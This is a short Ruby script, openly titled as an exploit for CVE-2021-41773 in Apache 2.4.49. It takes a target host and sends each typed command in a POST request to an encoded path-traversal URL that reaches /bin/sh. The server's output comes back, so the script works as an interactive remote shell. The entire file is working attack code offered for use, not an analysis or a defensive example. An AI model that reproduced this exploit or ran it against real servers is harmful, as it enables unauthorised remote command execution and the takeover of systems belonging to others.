require 'optparse'
require 'faraday'

def prompt
  print "\033[1;32m>>> \033[0m"
  gets
end

def run(host)

  while true
    input = prompt
    if input.strip == 'exit'
      exit 0
    else
      data = "echo Content-Type: text/plain; echo; #{input}"
      response = Faraday.post("#{host}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh", data)

      printf response.body
    end
  end
end

def main

  printf "\033[1;35mApache2 2.4.49\033[1;39m - \033[1;31mExploit\033[1;39m - \033[1;32mCVE-2021-41773\033[0m \n"

  options = {}
  OptionParser.new do |opts|
    opts.on('-t', '--target TARGET', 'Target host') {
      |o| options[:host] = o
    }
    opts.on('-h', '--help', '') do
      puts opts
      exit 0
    end
  end.parse!

  if options.key?(:host)
    run(options[:host])
  end
end

main